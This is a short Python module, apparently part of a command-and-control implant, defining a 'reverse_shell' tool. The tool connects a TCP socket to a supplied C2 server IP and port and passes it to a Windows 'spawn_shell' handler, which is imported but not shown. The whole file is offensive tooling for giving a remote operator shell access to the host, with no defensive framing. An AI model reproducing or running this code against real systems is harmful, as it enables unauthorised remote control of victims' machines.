"""
Tool: Reverse Shell
Establishes a reverse shell connection to the server
"""
import socket
import sys

from .shell_handler_windows import spawn_shell

def reverse_shell(server_ip: str, port: int) -> str:
    """
    Launches a reverse shell to the server
    
    Parameters
    ----------
    server_ip : str
        C2 server IP
    port : int
        Port for the reverse shell connection
    
    Returns
    -------
    str
        Success or error message
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server_ip, port))
        
        spawn_shell(s)
        s.close()
        return f"SUCCESS: Reverse shell initiated on port {port}"
    except Exception as e:
        return f"Error: {str(e)}"
